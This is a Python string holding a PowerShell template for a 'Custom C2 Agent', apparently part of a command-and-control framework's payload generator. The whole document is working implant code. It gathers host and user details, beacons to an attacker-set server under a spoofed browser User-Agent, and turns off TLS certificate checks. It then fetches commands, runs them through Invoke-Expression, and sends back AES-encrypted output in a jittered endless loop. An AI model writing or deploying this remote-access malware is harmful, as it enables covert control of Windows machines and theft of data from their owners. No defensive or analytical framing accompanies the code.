POWERSHELL_TEMPLATE = '''# Custom C2 Agent - Windows PowerShell
# Encrypted beacon-style communication

param(
    [string]$ServerURL = "{server_url}",
    [string]$AuthToken = "{auth_token}",
    [string]$EncryptionPassword = "{encryption_password}",
    [int]$BeaconInterval = {beacon_interval},
    [int]$Jitter = {jitter}
)

# Encryption functions
function Get-EncryptionKey {{
    param([string]$Password = $EncryptionPassword)
    
    $salt = [System.Text.Encoding]::UTF8.GetBytes("c2_infrastructure_salt_2024")
    $iterations = 100000
    
    $key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, $iterations)
    return [Convert]::ToBase64String($key.GetBytes(32))
}}

function Encrypt-Data {{
    param([string]$Data, [string]$Key)
    
    try {{
        $keyBytes = [Convert]::FromBase64String($Key)
        $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        
        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
        $encryptedData = $encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
        
        $combined = $aes.IV + $encryptedData
        return [Convert]::ToBase64String($combined)
    }}
    catch {{
        return $null
    }}
}}

function Decrypt-Data {{
    param([string]$EncryptedData, [string]$Key)
    
    try {{
        $keyBytes = [Convert]::FromBase64String($Key)
        $combined = [Convert]::FromBase64String($EncryptedData)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $iv = $combined[0..15]
        $encryptedData = $combined[16..($combined.Length - 1)]
        
        $aes.IV = $iv
        
        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
        $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
        
        return [System.Text.Encoding]::UTF8.GetString($decryptedData)
    }}
    catch {{
        return $null
    }}
}}

function Get-SystemInfo {{
    $info = @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os_type = "Windows"
        os_version = [System.Environment]::OSVersion.VersionString
        domain = $env:USERDOMAIN
        is_admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }}
    return $info
}}

function Invoke-Command {{
    param([string]$Command)
    
    try {{
        $output = Invoke-Expression -Command $Command 2>&1 | Out-String
        return $output
    }}
    catch {{
        return "Error: $($_.Exception.Message)"
    }}
}}

function Send-Beacon {{
    param([string]$SessionID, [string]$EncryptionKey)
    
    try {{
        $sysInfo = Get-SystemInfo
        
        if ($SessionID) {{
            $sysInfo['session_id'] = $SessionID
        }}
        
        $jsonData = $sysInfo | ConvertTo-Json -Compress
        $encryptedData = Encrypt-Data -Data $jsonData -Key $EncryptionKey
        
        $body = @{{
            data = $encryptedData
        }} | ConvertTo-Json
        
        $headers = @{{
            'Authorization' = "Bearer $AuthToken"
            'Content-Type' = 'application/json'
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
        
        $response = Invoke-RestMethod -Uri "$ServerURL/api/v1/sync" `
                                      -Method Post `
                                      -Body $body `
                                      -Headers $headers `
                                      -TimeoutSec 30
        
        if ($response.status -eq 'success') {{
            $decrypted = Decrypt-Data -EncryptedData $response.data -Key $EncryptionKey
            $responseData = $decrypted | ConvertFrom-Json
            return $responseData
        }}
    }}
    catch {{
        return $null
    }}
}}

function Submit-Results {{
    param(
        [string]$SessionID,
        [string]$TaskID,
        [string]$Output,
        [string]$EncryptionKey
    )
    
    try {{
        $resultData = @{{
            session_id = $SessionID
            task_id = $TaskID
            output = $Output
        }} | ConvertTo-Json -Compress
        
        $encryptedData = Encrypt-Data -Data $resultData -Key $EncryptionKey
        
        $body = @{{
            data = $encryptedData
        }} | ConvertTo-Json
        
        $headers = @{{
            'Authorization' = "Bearer $AuthToken"
            'Content-Type' = 'application/json'
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
        
        $response = Invoke-RestMethod -Uri "$ServerURL/api/v1/results" `
                                      -Method Post `
                                      -Body $body `
                                      -Headers $headers `
                                      -TimeoutSec 30
        
        return ($response.status -eq 'success')
    }}
    catch {{
        return $false
    }}
}}

function Start-Agent {{
    $encryptionKey = Get-EncryptionKey
    $sessionID = $null
    
    Write-Host "[*] Agent starting..."
    Write-Host "[*] Server: $ServerURL"
    Write-Host "[*] Beacon: $BeaconInterval seconds (±$Jitter seconds)"
    
    while ($true) {{
        try {{
            $response = Send-Beacon -SessionID $sessionID -EncryptionKey $encryptionKey
            
            if ($response) {{
                if (-not $sessionID) {{
                    $sessionID = $response.session_id
                    Write-Host "[+] Session: $sessionID"
                }}
                
                if ($response.tasks) {{
                    foreach ($task in $response.tasks) {{
                        Write-Host "[*] Task: $($task.task_id)"
                        
                        $output = Invoke-Command -Command $task.command
                        
                        $success = Submit-Results -SessionID $sessionID `
                                                  -TaskID $task.task_id `
                                                  -Output $output `
                                                  -EncryptionKey $encryptionKey
                        
                        if ($success) {{
                            Write-Host "[+] Results submitted"
                        }}
                    }}
                }}
            }}
            
            $jitterAmount = Get-Random -Minimum (-$Jitter) -Maximum $Jitter
            $sleepTime = $BeaconInterval + $jitterAmount
            
            if ($sleepTime -lt 0) {{ $sleepTime = 1 }}
            
            Start-Sleep -Seconds $sleepTime
        }}
        catch {{
            Start-Sleep -Seconds 60
        }}
    }}
}}

Start-Agent
'''